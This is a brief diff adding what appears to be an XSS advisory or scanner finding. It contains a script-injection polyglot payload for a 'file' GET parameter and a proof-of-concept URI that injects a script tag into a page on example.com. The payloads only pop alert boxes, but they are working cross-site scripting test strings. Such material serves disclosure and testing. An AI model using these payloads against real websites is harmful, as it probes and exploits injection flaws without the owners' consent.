@@ -1,0 +1,6 @@
+Exploit XSS:
+The GET variable &#039;file&#039; has been set to:
+&#039;;alert(String.fromCharCode(88,83,83))//\&#039;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88 ,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#039;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt; 
+
+Proof-of-concpet URI:
+http://www.example.com/index.php?file=News%3CScRiPt%20%0a%0d%3Ealert(1121436095)%3B%3C/ScRiPt%3E
